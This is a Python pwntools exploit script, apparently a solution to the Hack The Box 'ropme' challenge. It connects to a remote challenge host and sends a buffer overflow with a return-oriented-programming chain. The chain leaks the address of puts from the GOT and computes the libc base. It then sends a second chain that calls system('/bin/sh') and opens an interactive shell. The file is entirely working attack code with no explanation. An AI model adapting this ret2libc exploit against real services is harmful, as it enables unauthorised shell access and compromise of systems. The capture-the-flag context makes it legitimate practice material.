#!/usr/bin/env python
from pwn import *

p = remote('docker.hackthebox.eu', 30852)
#p = process('./ropme')
libc = ELF("./libc.so.6")
elf = ELF("./ropme")

pop_rdi = p64(0x00000000004006d3)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_fnc = elf.symbols['main']
	 
payload = 'A' * 72 + pop_rdi + p64(puts_got) +  p64(puts_plt) + p64(main_fnc)

p.recvuntil('ROP me outside, how \'about dah?\n')
p.sendline(payload)

libc_base = u64(p.recv(6).ljust(8, '\0')) - libc.symbols['puts']

log.info(libc_base)

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh\x00").next()

bin_sh_addr = bin_sh - 64

payload = 'A' * 72 + pop_rdi + p64(bin_sh_addr) + p64(system)

p.sendlineafter('ROP me outside, how \'about dah?\n', payload)

p.interactive()
